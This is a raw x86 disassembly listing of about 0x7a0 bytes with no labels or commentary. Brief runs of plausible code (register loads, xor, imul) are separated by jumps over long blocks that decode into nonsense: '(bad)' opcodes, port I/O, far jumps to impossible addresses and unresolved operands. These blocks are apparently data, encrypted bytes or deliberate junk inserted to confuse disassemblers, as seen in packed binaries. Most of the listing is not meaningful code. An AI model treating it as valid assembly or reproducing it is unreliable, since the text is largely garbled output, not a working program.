  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	fistp  QWORD PTR [ebx+ebx*2+0x6a]
  4059b4:	push   0x32
  4059b6:	jle    0x405a36
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x405950
  4059bd:	xlat   BYTE PTR ds:[ebx]
  4059be:	mov    ?,WORD PTR [edi+0x6f]
  4059c1:	sub    eax,0x6541d64d
  4059c6:	mov    ?,WORD PTR [edi+0x5b]
  4059c9:	dec    edx
  4059ca:	push   eax
  4059cb:	mov    bh,BYTE PTR [esi]
  4059cd:	dec    edx
  4059ce:	cmp    eax,0x1f7aff33
  4059d3:	not    DWORD PTR [eax-0x30d17c30]
  4059d9:	rcr    BYTE PTR [edx],cl
  4059db:	cmp    eax,0x27a02f22
  4059e0:	pop    ebp
  4059e1:	jp     0x4059ce
  4059e3:	popa   
  4059e4:	loope  0x4059ad
  4059e6:	mov    ecx,0xe3a6f89d
  4059eb:	jnp    0x4059f1
  4059ed:	dec    esi
  4059ee:	push   ebp
  4059ef:	pop    esi
  4059f0:	lods   eax,DWORD PTR ds:[esi]
  4059f1:	and    DWORD PTR [edx+eax*4],ecx
  4059f4:	sub    edx,DWORD PTR [eax]
  4059f6:	mov    BYTE PTR [eax-0x5a],ah
  4059f9:	pop    esp
  4059fa:	aas    
  4059fb:	adc    bh,bh
  4059fd:	jno    0x405a01
  4059ff:	inc    ebp
  405a00:	cwde   
  405a01:	repz inc ebp
  405a03:	(bad)  
  405a04:	loope  0x405a29
  405a06:	test   BYTE PTR [edx-0x51c60892],al
  405a0c:	mov    BYTE PTR [esi+edx*8+0x27dfcb64],0xd5
  405a14:	xchg   ecx,eax
  405a15:	scas   al,BYTE PTR es:[edi]
  405a16:	mov    ebx,0x82e8eeee
  405a1b:	into   
  405a1c:	mov    bh,BYTE PTR [esi-0x4f920db1]
  405a22:	(bad)  
  405a23:	push   eax
  405a24:	and    al,0x6b
  405a26:	popa   
  405a27:	lods   eax,DWORD PTR ds:[esi]
  405a28:	addr16 jl 0x4059b7
  405a2b:	stos   DWORD PTR es:[edi],eax
  405a2c:	inc    esi
  405a2d:	pop    esi
  405a2e:	in     al,0x57
  405a30:	enter  0xdc3d,0x99
  405a34:	in     al,0x32
  405a36:	gs (bad) 
  405a38:	pop    edi
  405a39:	xchg   BYTE PTR [esi],cl
  405a3b:	sub    DWORD PTR [ecx-0x12],edx
  405a3e:	sar    edx,1
  405a40:	mov    ah,0x10
  405a42:	shr    BYTE PTR [eax],1
  405a44:	or     bh,dh
  405a46:	fmulp  st(5),st
  405a48:	ret    
  405a49:	sub    eax,0x9dce06b3
  405a4e:	loop   0x405aad
  405a50:	push   edi
  405a51:	outs   dx,BYTE PTR ds:[esi]
  405a52:	xchg   bh,bl
  405a54:	loope  0x405a9e
  405a56:	sub    DWORD PTR [edx-0x23ab80d5],0xffffffa2
  405a5d:	loope  0x405aa8
  405a5f:	push   ebx
  405a60:	jne    0x405a4d
  405a62:	call   0xa9d0:0xe4086865
  405a69:	scas   al,BYTE PTR es:[edi]
  405a6a:	popf   
  405a6b:	nop
  405a6c:	push   esi
  405a6d:	daa    
  405a6e:	cmp    BYTE PTR [ebp-0x5d],bh
  405a71:	lock arpl WORD PTR [ecx-0x1c],dx
  405a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a76:	lods   al,BYTE PTR ds:[esi]
  405a77:	fist   DWORD PTR [edi+0xa9c73ef]
  405a7d:	retf   
  405a7e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  405a80:	mov    fs,WORD PTR [esi-0x5d]
  405a83:	sbb    DWORD PTR [ebx+0x10],esp
  405a86:	ror    BYTE PTR [esi-0x4],cl
  405a89:	pop    esp
  405a8a:	xchg   esp,eax
  405a8b:	or     ebp,ebx
  405a8d:	xchg   esp,eax
  405a8e:	mov    al,ds:0xf759a111
  405a93:	out    dx,eax
  405a94:	jmp    0x81d5a30
  405a99:	stos   DWORD PTR es:[edi],eax
  405a9a:	pusha  
  405a9b:	mov    dl,BYTE PTR [ebx]
  405a9d:	sub    DWORD PTR [esi-0x1c],edx
  405aa0:	ds leave 
  405aa2:	aam    0x55
  405aa4:	mov    ch,0x80
  405aa6:	ret    0x5779
  405aa9:	mov    al,ds:0x5821e3a5
  405aae:	pop    ss
  405aaf:	jecxz  0x405a9a
  405ab1:	lods   eax,DWORD PTR ds:[esi]
  405ab2:	pop    esi
  405ab3:	stc    
  405ab4:	shl    DWORD PTR [ecx-0x1c3d9495],cl
  405aba:	scas   eax,DWORD PTR es:[edi]
  405abb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405abc:	pop    eax
  405abd:	(bad)  
  405abe:	aaa    
  405abf:	lds    ebx,FWORD PTR [edx+0x72b7b172]
  405ac5:	loopne 0x405adb
  405ac7:	das    
  405ac8:	lods   al,BYTE PTR ds:[esi]
  405ac9:	xlat   BYTE PTR ds:[ebx]
  405aca:	xchg   ebx,eax
  405acb:	jl     0x405b4c
  405acd:	setb   BYTE PTR [eax+0x27]
  405ad1:	xor    dh,BYTE PTR [edx-0xd]
  405ad4:	inc    ebp
  405ad5:	dec    esp
  405ad6:	enter  0x67ca,0xa4
  405ada:	inc    esp
  405adb:	mov    ecx,0x8742f6e3
  405ae0:	or     dl,BYTE PTR [esi]
  405ae2:	loope  0x405ae9
  405ae4:	cmc    
  405ae5:	aas    
  405ae6:	inc    ebx
  405ae7:	shl    DWORD PTR [ecx+0x2a25baad],cl
  405aed:	mov    DWORD PTR [esi+esi*2-0x4c1b45bc],esp
  405af4:	enter  0x1ffa,0x8e
  405af8:	jbe    0x405a7e
  405afa:	fcmovb st,st(4)
  405afc:	pop    edi
  405afd:	adc    BYTE PTR [ebp-0x6a],dh
  405b00:	clc    
  405b01:	adc    al,0x1e
  405b03:	pop    ebx
  405b04:	xchg   esi,eax
  405b05:	or     eax,0x223de558
  405b0a:	lahf   
  405b0b:	and    ax,0x48f7
  405b0f:	test   esi,esi
  405b11:	adc    BYTE PTR [ebx+0x2f9c487],bl
  405b17:	push   edi
  405b18:	mov    ebx,0x79bd38b8
  405b1d:	data16 jo 0x405af5
  405b20:	jmp    0xe51f:0x96ec93da
  405b27:	ds pop edi
  405b29:	mov    cl,0x54
  405b2b:	sti    
  405b2c:	jbe    0x405b7b
  405b2e:	xchg   ebx,eax
  405b2f:	mov    ecx,0x86911363
  405b34:	add    al,0x4e
  405b36:	sub    BYTE PTR [edx],dh
  405b38:	icebp  
  405b39:	sbb    BYTE PTR [eax*8+0x7395e9bd],cl
  405b40:	sub    DWORD PTR [ecx+esi*8],eax
  405b43:	push   ds
  405b44:	push   0xb
  405b46:	push   ebp
  405b47:	pop    eax
  405b48:	push   ecx
  405b49:	fwait
  405b4a:	sub    DWORD PTR [ebx+ebx*8-0x5b],esp
  405b4e:	stos   BYTE PTR es:[edi],al
  405b4f:	loope  0x405b8f
  405b51:	les    ebx,FWORD PTR [edx]
  405b53:	cmp    eax,0x2be51b5b
  405b58:	enter  0x3871,0x7
  405b5c:	and    al,0x24
  405b5e:	mov    bh,BYTE PTR [edi+0x36aa19d7]
  405b64:	sahf   
  405b65:	adc    DWORD PTR [edx+0x679f0977],eax
  405b6b:	int3   
  405b6c:	mov    ds:0x2f7d6648,al
  405b71:	jge    0x405b14
  405b73:	add    bh,BYTE PTR [edx+0x2f]
  405b76:	lahf   
  405b77:	addr16 cmp al,0xe
  405b7a:	xchg   BYTE PTR [eax+0x1a],ch
  405b7d:	cmp    DWORD PTR [ecx+0x9],ebx
  405b80:	rcl    DWORD PTR [esi-0x7b],0xd9
  405b84:	outs   dx,DWORD PTR ds:[esi]
  405b85:	add    dh,bh
  405b87:	out    0x9,al
  405b89:	loope  0x405b13
  405b8b:	neg    BYTE PTR [eax+0x1b53e46d]
  405b91:	out    0x42,al
  405b93:	mov    ds:0x7bbd9f0d,eax
  405b98:	mov    ch,0xf4
  405b9a:	(bad)  
  405b9b:	mov    DWORD PTR [esi-0x2d6c1c8],eax
  405ba1:	jb     0x405c1c
  405ba3:	xchg   ebp,eax
  405ba4:	fst    DWORD PTR [esi]
  405ba6:	fadd   st(4),st
  405ba8:	dec    esi
  405ba9:	inc    esp
  405baa:	xchg   ecx,eax
  405bab:	xchg   ebx,eax
  405bac:	scas   eax,DWORD PTR es:[edi]
  405bad:	jmp    0x405b98
  405baf:	fcos   
  405bb1:	push   eax
  405bb2:	adc    DWORD PTR [ebx+eax*4],0x42
  405bb6:	or     dh,BYTE PTR [ebp+eiz*4+0x17]
  405bba:	repnz mov ss,WORD PTR [ecx]
  405bbd:	inc    edi
  405bbe:	jecxz  0x405c0e
  405bc0:	xor    al,0x9f
  405bc2:	mov    al,0x88
  405bc4:	xchg   esi,eax
  405bc5:	cdq    
  405bc6:	cmp    esi,DWORD PTR ss:[edi+ebx*8-0x2b]
  405bcb:	add    esi,esi
  405bcd:	pop    es
  405bce:	enter  0x3e75,0x9d
  405bd2:	xchg   edx,eax
  405bd3:	mov    dh,0x27
  405bd5:	xchg   esi,eax
  405bd6:	cs pop es
  405bd8:	rol    DWORD PTR [edx+ecx*4-0x3d],1
  405bdc:	pop    edx
  405bdd:	sar    DWORD PTR [ebx-0x27],1
  405be0:	adc    BYTE PTR [ebp-0x1],al
  405be3:	test   eax,esi
  405be5:	inc    edx
  405be6:	xchg   edi,eax
  405be7:	imul   ecx,DWORD PTR [esp+edx*8],0xb26d2526
  405bee:	jbe    0x405bd4
  405bf0:	adc    al,BYTE PTR [edi-0x526c285d]
  405bf6:	int3   
  405bf7:	arpl   cx,di
  405bf9:	xchg   ebx,eax
  405bfa:	jmp    0x1dcd:0x9ad06291
  405c01:	arpl   WORD PTR [ecx],ax
  405c03:	les    esp,FWORD PTR [edx]
  405c05:	pop    ebx
  405c06:	inc    esi
  405c07:	add    BYTE PTR [ecx],0xcc
  405c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c0b:	push   0xffffffa6
  405c0d:	sbb    al,0xb4
  405c0f:	stos   DWORD PTR es:[edi],eax
  405c10:	rcr    BYTE PTR [edx-0x70],0x58
  405c14:	jle    0x405c2b
  405c16:	std    
  405c17:	xchg   DWORD PTR [ebp+ecx*8-0x5e],edx
  405c1b:	adc    edi,DWORD PTR [ebp-0x2c74ac0f]
  405c21:	test   dl,al
  405c23:	fbld   TBYTE PTR [ecx]
  405c25:	lods   eax,DWORD PTR ds:[esi]
  405c26:	rcr    BYTE PTR [ebx-0x41],0x18
  405c2a:	xor    eax,0x76267fa8
  405c2f:	or     cl,bl
  405c31:	sub    DWORD PTR [ebx-0x38],esi
  405c34:	xchg   esp,eax
  405c35:	jne    0x405c4f
  405c37:	in     al,dx
  405c38:	or     DWORD PTR [ecx],esi
  405c3a:	add    al,0x47
  405c3c:	fs and ecx,edi
  405c3f:	lock ds dec ebp
  405c42:	or     DWORD PTR [ecx-0x61b13d81],esp
  405c48:	sub    BYTE PTR [ebx],dl
  405c4a:	xchg   ebp,eax
  405c4b:	pop    ds
  405c4c:	jle    0x405c58
  405c4e:	imul   ebx,edi,0xffffffcd
  405c51:	jno    0x405c94
  405c53:	aam    0x63
  405c55:	push   ecx
  405c56:	(bad)  
  405c57:	xchg   ebp,eax
  405c58:	sbb    dl,BYTE PTR [eax+ebx*4+0x58]
  405c5c:	pop    ss
  405c5d:	shl    DWORD PTR [eax+0x27d7ab04],0x58
  405c64:	cwde   
  405c65:	loope  0x405bfa
  405c67:	repz pushfw 
  405c6a:	pushf  
  405c6b:	cdq    
  405c6c:	mov    dh,0x71
  405c6e:	push   esp
  405c6f:	ins    BYTE PTR es:[edi],dx
  405c70:	sub    ch,BYTE PTR [eax+0x16d18af7]
  405c76:	mov    al,ds:0x8712ac2a
  405c7b:	mov    ebx,0x957b4dfa
  405c80:	daa    
  405c81:	enter  0xde36,0xad
  405c85:	and    eax,0x39bd45df
  405c8a:	xchg   ebp,eax
  405c8b:	(bad)  
  405c8c:	aaa    
  405c8d:	aad    0xd2
  405c8f:	cmp    ch,al
  405c91:	pop    ecx
  405c92:	mov    ah,0xbe
  405c94:	scas   al,BYTE PTR es:[edi]
  405c95:	call   0x3ad8:0xf9abd35b
  405c9c:	bound  esp,QWORD PTR [esi]
  405c9e:	pop    esp
  405c9f:	enter  0x2b52,0x6
  405ca3:	in     al,dx
  405ca4:	fs push esi
  405ca6:	xor    ch,BYTE PTR [ebp+0x70]
  405ca9:	stos   DWORD PTR es:[edi],eax
  405caa:	inc    ebp
  405cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cac:	or     al,0xf0
  405cae:	aad    0x6d
  405cb0:	sar    BYTE PTR ds:0xb8dd4998,cl
  405cb6:	jbe    0x405cd2
  405cb8:	pop    ds
  405cb9:	shl    eax,1
  405cbb:	pop    es
  405cbc:	mov    bl,0xb8
  405cbe:	(bad)  
  405cbf:	mov    ch,BYTE PTR [ebp+0x62]
  405cc2:	in     al,0xa7
  405cc4:	push   ebp
  405cc5:	dec    edi
  405cc6:	icebp  
  405cc7:	or     eax,0x51b157c
  405ccc:	retf   0xe754
  405ccf:	(bad)  
  405cd0:	mov    eax,ds:0x2ba04999
  405cd5:	pop    esp
  405cd6:	or     eax,0x9af76e3d
  405cdb:	xor    BYTE PTR [edi],al
  405cdd:	ins    DWORD PTR es:[edi],dx
  405cde:	retf   
  405cdf:	or     eax,0x102a2b47
  405ce4:	in     eax,dx
  405ce5:	or     al,0xd6
  405ce7:	paddsb mm5,QWORD PTR gs:[edi+0x63fd404f]
  405cef:	jnp    0x405d58
  405cf1:	pop    edi
  405cf2:	dec    ebp
  405cf3:	xor    BYTE PTR [eax],bl
  405cf5:	lea    ebp,[esi+0x57]
  405cf8:	ret    0x558b
  405cfb:	int3   
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	jg     0x405d36
  405d2d:	outs   dx,DWORD PTR ds:[esi]
  405d2e:	push   edx
  405d2f:	das    
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405d0d
  405d38:	add    eax,DWORD PTR [esi+0x430ecfa3]
  405d3e:	cs sahf 
  405d40:	push   ecx
  405d41:	inc    edi
  405d42:	xchg   esp,eax
  405d43:	sub    bh,BYTE PTR [ebp+0x9]
  405d46:	outs   dx,BYTE PTR ds:[esi]
  405d47:	int    0xac
  405d49:	pusha  
  405d4a:	push   esp
  405d4b:	xchg   DWORD PTR [ecx],eax
  405d4d:	cmc    
  405d4e:	(bad)  
  405d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d50:	and    al,0x3
  405d52:	call   0x53e70d22
  405d57:	add    edi,DWORD PTR [esi]
  405d59:	pop    ecx
  405d5a:	les    edi,FWORD PTR [ecx]
  405d5c:	jecxz  0x405dc2
  405d5e:	pop    eax
  405d5f:	(bad)  
  405d60:	ds or  eax,0x80927d07
  405d66:	out    0xb,al
  405d68:	mov    eax,0xe30b799d
  405d6d:	pop    ds
  405d6e:	stos   DWORD PTR es:[edi],eax
  405d6f:	xchg   edx,eax
  405d70:	sbb    al,0xa4
  405d72:	sub    al,0x2b
  405d74:	aam    0xfc
  405d76:	mov    edx,0xcbd4feff
  405d7b:	inc    edx
  405d7c:	jle    0x405d60
  405d7e:	add    eax,0xf29a6c7a
  405d83:	js     0x405d2b
  405d85:	mov    DWORD PTR [edx+0x6543dfd8],ecx
  405d8b:	ins    DWORD PTR es:[edi],dx
  405d8c:	push   ds
  405d8d:	fdiv   QWORD PTR [ebx-0x1c]
  405d90:	dec    eax
  405d91:	cs cld 
  405d93:	inc    esp
  405d94:	mov    ebp,0x97637b0
  405d99:	icebp  
  405d9a:	imul   esi,DWORD PTR [ecx-0x152a3bac],0x5f
  405da1:	mov    ebp,0xed86aa28
  405da6:	loopne 0x405d96
  405da8:	dec    esi
  405da9:	jmp    0x405de1
  405dab:	mov    WORD PTR [esi-0x5ed96bb7],?
  405db1:	and    eax,0xaba5d692
  405db6:	ret    0x584f
  405db9:	push   ds
  405dba:	outs   dx,DWORD PTR ds:[esi]
  405dbb:	adc    DWORD PTR [esi+0x6cdcb3ac],ecx
  405dc1:	inc    ecx
  405dc2:	mov    edx,0xfa5c4039
  405dc7:	int3   
  405dc8:	xchg   ecx,eax
  405dc9:	daa    
  405dca:	xchg   ebx,eax
  405dcb:	push   cs
  405dcc:	neg    DWORD PTR [ebp+0x70524dbe]
  405dd2:	in     al,dx
  405dd3:	push   esp
  405dd4:	jns    0x405dad
  405dd6:	mov    dl,0x42
  405dd8:	nop
  405dd9:	xchg   ebp,eax
  405dda:	(bad)  
  405ddb:	fs pop esi
  405ddd:	add    eax,0x26eaeef3
  405de2:	xor    DWORD PTR ds:[edx+0x750ae1c4],0xffffff85
  405dea:	jno    0x405e2d
  405dec:	push   0x9df704ff
  405df1:	sbb    bh,BYTE PTR [edx+esi*2]
  405df4:	mov    dh,0x2f
  405df6:	xlat   BYTE PTR ds:[ebx]
  405df7:	dec    edx
  405df8:	jne    0x405e6f
  405dfa:	lods   eax,DWORD PTR ds:[esi]
  405dfb:	cwde   
  405dfc:	stos   BYTE PTR es:[edi],al
  405dfd:	leave  
  405dfe:	fwait
  405dff:	inc    ebp
  405e00:	and    al,al
  405e02:	pop    ecx
  405e03:	sbb    eax,0x12c4adca
  405e08:	sbb    dl,BYTE PTR [esi-0x67]
  405e0b:	in     eax,dx
  405e0c:	out    dx,eax
  405e0d:	pop    esi
  405e0e:	push   edx
  405e0f:	mov    WORD PTR [ebp-0x2c7e7f5c],fs
  405e15:	pop    eax
  405e16:	mov    ah,dl
  405e18:	(bad)  
  405e19:	imul   BYTE PTR [ebx-0x52]
  405e1c:	add    eax,0x6e431821
  405e21:	call   0x82e1e24a
  405e26:	ja     0x405db7
  405e28:	inc    esi
  405e29:	retf   0xb5da
  405e2c:	stc    
  405e2d:	sub    DWORD PTR [edx+0x6f5f65da],esi
  405e33:	lods   al,BYTE PTR ds:[esi]
  405e34:	push   edi
  405e35:	adc    edx,DWORD PTR [eax-0x29ba7cbb]
  405e3b:	in     al,0xf6
  405e3d:	mov    ds:0xc86003cc,eax
  405e42:	jns    0x405e0e
  405e44:	idiv   DWORD PTR [ebp+0x2e16ff50]
  405e4a:	clc    
  405e4b:	xchg   DWORD PTR ds:0x57251793,ebp
  405e51:	out    dx,eax
  405e52:	or     edx,DWORD PTR cs:[ebx+0x802ed3b]
  405e59:	shl    DWORD PTR [esi-0x46],0x7b
  405e5d:	int3   
  405e5e:	rcr    DWORD PTR [ecx],0xe4
  405e61:	or     eax,0xf2d7b864
  405e66:	repz lea edi,[esi-0x391f5aae]
  405e6d:	not    BYTE PTR [edx-0x2ca4b261]
  405e73:	dec    edi
  405e74:	adc    esp,edi
  405e76:	xchg   edx,eax
  405e77:	in     eax,0xb0
  405e79:	out    0x93,eax
  405e7b:	hlt    
  405e7c:	ret    
  405e7d:	clc    
  405e7e:	adc    DWORD PTR [edi-0x2],esi
  405e81:	push   ebp
  405e82:	cmp    edi,esi
  405e84:	test   BYTE PTR [edx+0x7555efbd],dh
  405e8a:	fist   WORD PTR [eax+0x1f]
  405e8d:	add    al,0x8e
  405e8f:	mov    ebx,0xd06b737f
  405e94:	jl     0x405eab
  405e96:	or     BYTE PTR [ebp+edi*1+0x1cd28dc6],bl
  405e9d:	mov    ebx,?
  405e9f:	and    DWORD PTR [edx],esp
  405ea1:	sti    
  405ea2:	sbb    BYTE PTR [esi+0x7742d33],al
  405ea8:	inc    esp
  405ea9:	xor    al,0x4c
  405eab:	mov    ds:0x12e9dc05,al
  405eb0:	dec    edx
  405eb1:	pop    edi
  405eb2:	sbb    ecx,ecx
  405eb4:	dec    ebp
  405eb5:	or     al,0x87
  405eb7:	mov    ?,WORD PTR [esi]
  405eb9:	ds cmp esi,esp
  405ebc:	cld    
  405ebd:	add    eax,0xaa3e8ada
  405ec2:	inc    eax
  405ec3:	sbb    ecx,esp
  405ec5:	mov    eax,DWORD PTR [ecx]
  405ec7:	inc    ebx
  405ec8:	inc    esi
  405ec9:	push   ebx
  405eca:	and    DWORD PTR [edi],0xffffffb2
  405ecd:	aam    0xd5
  405ecf:	mov    cl,0x11
  405ed1:	loop   0x405e5e
  405ed3:	xchg   ecx,eax
  405ed4:	push   ebx
  405ed5:	pop    ss
  405ed6:	xor    ch,BYTE PTR [ebx+0x7be5c3b0]
  405edc:	popf   
  405edd:	ficom  DWORD PTR [ebp+0x71]
  405ee0:	jb     0x405f2c
  405ee2:	enter  0x30f4,0x21
  405ee6:	jne    0x405e9c
  405ee8:	or     BYTE PTR [edi+0x6a0a0870],bh
  405eee:	xchg   DWORD PTR [esi-0x6150ad31],ebp
  405ef4:	jp     0x405ecb
  405ef6:	aad    0x1a
  405ef8:	aaa    
  405ef9:	adc    eax,0xfca438a5
  405efe:	xchg   DWORD PTR ds:0x6dadf1f4,esi
  405f04:	call   FWORD PTR [ebx-0x2]
  405f07:	les    ebx,FWORD PTR [ebp-0x58]
  405f0a:	mov    ds:0x617fc098,eax
  405f0f:	test   eax,0x1b4e9193
  405f14:	loopne 0x405ed3
  405f16:	shl    DWORD PTR ds:0xf9bbc498,0x68
  405f1d:	fs (bad) 
  405f1f:	(bad)  
  405f20:	jge    0x405f6d
  405f22:	stos   BYTE PTR es:[edi],al
  405f23:	sbb    eax,0x40500628
  405f28:	inc    ecx
  405f29:	(bad)  [esi]
  405f2b:	rol    DWORD PTR [edx-0x51],1
  405f2e:	xchg   edi,eax
  405f2f:	xchg   ebp,eax
  405f30:	sbb    DWORD PTR [edx],0x95406c26
  405f36:	mov    al,0x5e
  405f38:	mov    edx,0x1382aea7
  405f3d:	sbb    BYTE PTR [ebx+0x2d06c6c1],ch
  405f43:	push   ebx
  405f44:	ins    DWORD PTR es:[edi],dx
  405f45:	xchg   esp,eax
  405f46:	mov    bh,0x44
  405f48:	shr    DWORD PTR ds:0x6bc93887,cl
  405f4e:	rcr    BYTE PTR [ebx-0x312886ce],0x4
  405f55:	enter  0x28cd,0x72
  405f59:	adc    eax,0x3871c4aa
  405f5e:	cmp    ch,BYTE PTR [ecx+ecx*1-0x14574dd5]
  405f65:	dec    esp
  405f66:	adc    BYTE PTR [eax+edi*8-0x1e],al
  405f6a:	je     0x405f73
  405f6c:	enter  0xbb8,0x93
  405f70:	jp     0x405f09
  405f72:	mov    ebx,0x2fef55bf
  405f77:	xor    eax,0x4412cf94
  405f7c:	retf   
  405f7d:	inc    esp
  405f7e:	pop    edi
  405f7f:	arpl   si,bx
  405f81:	jne    0x405fad
  405f83:	into   
  405f84:	dec    esp
  405f86:	lods   al,BYTE PTR ds:[esi]
  405f87:	out    0xb9,al
  405f89:	lea    edi,[ebx-0x60]
  405f8c:	jne    0x405fb6
  405f8e:	jle    0x405f65
  405f90:	sbb    BYTE PTR [ecx+0x2de3a81c],0xd
  405f97:	xchg   BYTE PTR [edi+esi*8+0x5d],bh
  405f9b:	jmp    0x6dea:0x9dec6554
  405fa2:	xchg   DWORD PTR [esi],edi
  405fa4:	sahf   
  405fa5:	aaa    
  405fa6:	cmp    al,0x7e
  405fa8:	push   edx
  405fa9:	dec    ebx
  405faa:	pop    es
  405fab:	mov    bh,0xc5
  405fad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fae:	(bad)  [ebx+0xbc15a94]
  405fb4:	bound  esp,QWORD PTR [ecx+edi*4+0x5563e550]
  405fbb:	adc    al,0x3c
  405fbd:	sti    
  405fbe:	and    ecx,DWORD PTR [esi+esi*2-0x6149394d]
  405fc5:	enter  0xb01,0x81
  405fc9:	jb     0x406007
  405fcb:	fsubr  st,st(2)
  405fcd:	fdiv   DWORD PTR [edi-0x44]
  405fd0:	cli    
  405fd1:	sbb    ecx,DWORD PTR [ecx-0x465815c3]
  405fd7:	dec    ebp
  405fd8:	push   ecx
  405fd9:	test   eax,0xca91877d
  405fde:	in     eax,dx
  405fdf:	pop    sp
  405fe1:	dec    esp
  405fe2:	sub    BYTE PTR [esi+ebp*1],dl
  405fe5:	lock push es
  405fe7:	and    al,0xf0
  405fe9:	cmp    BYTE PTR [edx],cl
  405feb:	mov    bh,0xc3
  405fed:	adc    DWORD PTR [ecx+0x5e598dad],ecx
  405ff3:	fld    TBYTE PTR [ebx-0x43]
  405ff6:	rcl    DWORD PTR [ecx-0x3b],0xcb
  405ffa:	mov    esi,0x43b877ad
  405fff:	push   edx
  406000:	outs   dx,BYTE PTR ds:[esi]
  406001:	dec    esi
  406002:	arpl   WORD PTR [esi-0x5fb844ff],si
  406008:	addr16 (bad) 
  40600a:	shl    BYTE PTR [edx-0x61],1
  40600d:	je     0x40603a
  40600f:	or     eax,0x2d0aefad
  406014:	sub    eax,DWORD PTR [edi]
  406016:	fcomp  st(0)
  406018:	mov    dh,0x29
  40601a:	jns    0x40603f
  40601c:	js     0x405fee
  40601e:	xchg   edi,eax
  40601f:	add    eax,0xd3605557
  406024:	addr16 push es
  406026:	mov    edx,0xf60d9efe
  40602b:	xor    ch,BYTE PTR [edx]
  40602d:	inc    edi
  40602e:	push   cs
  40602f:	jae    0x405fe7
  406031:	sahf   
  406032:	stos   BYTE PTR es:[edi],al
  406033:	fsubp  st(0),st
  406035:	sbb    BYTE PTR [ecx],ah
  406037:	imul   esp,DWORD PTR [ebx+ebp*8+0x5f],0xb294cc0e
  40603f:	adc    eax,0xe3d96d05
  406044:	(bad)  
  406045:	out    dx,eax
  406046:	lahf   
  406047:	popa   
  406048:	retf   0x1700
  40604b:	retf   
  40604c:	mov    bl,0x72
  40604e:	sub    al,0xb7
  406050:	fs jnp 0x40603c
  406053:	and    DWORD PTR [esi],ebp
  406055:	retf   
  406056:	sub    eax,0xfeb0e13a
  40605b:	or     cl,BYTE PTR [ecx-0x9]
  40605e:	enter  0x9ac0,0x2b
  406062:	div    DWORD PTR [ebx]
  406064:	sub    dl,0xb8
  406067:	inc    esp
  406068:	push   eax
  406069:	cmc    
  40606a:	vpor   ymm1,ymm5,YMMWORD PTR [edx+0x3fdc56a1]
  406072:	(bad)  
  406074:	cmp    ebx,edx
  406076:	mov    edx,DWORD PTR [ebp-0x38]
  406079:	jmp    0x4063d3
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0x7a
  40608b:	std    
  40608c:	ins    BYTE PTR es:[edi],dx
  40608d:	out    dx,al
  40608e:	loopne 0x4060cd
  406090:	jle    0x406110
  406092:	xor    edi,DWORD PTR [ebp+0x7e]
  406095:	jle    0x40609b
  406097:	and    al,0x7
  406099:	add    eax,0xba2bd4a7
  40609e:	add    bh,BYTE PTR [ecx-0x1292d325]
  4060a4:	pop    ds
  4060a5:	pop    ds
  4060a6:	data16 sub ah,BYTE PTR [esi-0x52]
  4060aa:	or     BYTE PTR [ecx+0x6937c37a],dh
  4060b0:	es das 
  4060b2:	in     eax,0x57
  4060b4:	mov    bh,0xb9
  4060b6:	pop    ds
  4060b7:	repnz dec edi
  4060b9:	or     DWORD PTR [ecx+0x74],0xffffffe2
  4060bd:	sub    dl,BYTE PTR [ecx]
  4060bf:	test   al,0xec
  4060c1:	cli    
  4060c2:	rcr    BYTE PTR [esp+eax*1+0x49],1
  4060c6:	add    DWORD PTR [edx+0x47],0x11
  4060ca:	jecxz  0x4060e4
  4060cc:	xchg   esp,eax
  4060cd:	mov    WORD PTR [ebp-0x51],cs
  4060d0:	rcr    al,0xcc
  4060d3:	(bad)  
  4060d5:	xchg   ecx,eax
  4060d6:	and    BYTE PTR [ebp-0x77c63b8c],0x87
  4060dd:	cmp    ah,BYTE PTR [ebp+0x2f475a2c]
  4060e3:	call   0x33a369b0
  4060e8:	ret    
  4060e9:	add    DWORD PTR [esi+0x6e],ebp
  4060ec:	push   0x63c24fee
  4060f1:	push   edi
  4060f2:	and    bl,BYTE PTR [edi+0x2cf42d8]
  4060f8:	pop    ebp
  4060f9:	frstpm(287 only) 
  4060fb:	sbb    DWORD PTR [eax+ecx*2+0x79abf6a8],ecx
  406102:	stos   BYTE PTR es:[edi],al
  406103:	hlt    
  406104:	sbb    BYTE PTR [esi+0x32f9db64],cl
  40610a:	mov    eax,DWORD PTR [ebp+0x2961a658]
  406110:	pop    ebx
  406111:	add    dl,BYTE PTR [edi+eiz*1]
  406114:	mov    edx,0xfd6b955c
  406119:	test   al,0x7b
  40611b:	rcr    BYTE PTR [edx+edx*8],cl
  40611e:	add    eax,0xa5965e3b
  406123:	jb     0x4060ef
  406125:	loop   0x406148
  406127:	jmp    0x4060b4
  406129:	clc    
  40612a:	cmp    edi,DWORD PTR [ebx+0x28]
  40612d:	mov    ebx,0xf6e30958
  406132:	xchg   esp,eax
  406133:	dec    edi
  406134:	pushf  
  406135:	loope  0x4060e4
  406137:	jmp    0x406161
